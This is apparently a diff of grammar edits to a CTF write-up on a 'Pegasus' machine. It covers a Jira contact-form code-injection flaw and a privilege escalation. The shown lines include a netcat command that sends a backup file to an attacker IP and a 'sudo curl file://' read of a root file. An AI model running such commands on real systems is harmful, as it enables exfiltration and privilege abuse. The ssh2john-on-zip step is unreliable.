@@ -6,7 +6,7 @@ categories: CTF7E4
 
 ## Summary
 &nbsp;
-This machine had an old Jira instance running on port 8080 which has a remote code execution vulnerability in "Contact Administrators" form. When sending an email to Administrators through this form, it's possible to inject java code into Subject and Body message. The privilege escalation required some steps such as finding a backup file, cracking the zip password with private ssh key of user "Harvey" inside, then running curl with root permissions.
+This machine has an old Jira instance running on port 8080 which has a remote code execution vulnerability in "Contact Administrators" form. When sending an email to Administrators through this form, it's possible to inject java code into Subject and Body message. The privilege escalation required some steps such as finding a backup file, cracking the zip password with private ssh key of user "Harvey" inside, then running curl with root permissions.
 
 &nbsp;
 
@@ -125,7 +125,7 @@ Attacker machine:
 Pegasus Machine:
 > **→ nc -w 3 10.10.20.2 5555 < backup.zip**{: style="color: red"}
 
-Backup.zip was password protected but we can crack it using different tools, I prefer using [John](https://github.com/magnumripper/JohnTheRipper), but first we should convert the zip file to hash format in order for "John" to crack it.
+Backup.zip was password protected but we can crack it using different tools, I prefer using [John](https://github.com/magnumripper/JohnTheRipper), but first we should convert the zip file to a hash format in order for "John" to crack it.
 
 > **→ ssh2john backup.zip >> backup.john**{: style="color: red"}
 
@@ -195,7 +195,7 @@ From the command above, we can see that Harvey can use curl with root permission
 ![pegasus]({{ site.baseurl }}/assets/images/ctf7e4/machines/pegasus12.png){:.images}
 &nbsp;
 
-As we can see, python default http server doesn't accept POST requests. We can modify it or find an already modified version on github but since the file is stored on the local machine that we're already in then we can use **file://** protocol to read it.
+Python default http server doesn't accept POST requests. We can modify it or find an already modified version on github but since the file is stored on the local machine that we're already in, then we can use **file://** protocol to read it.
 
 > **→ harvey@pegasus:~$ sudo curl file:///root/flag.txt**{: style="color: red"}
 
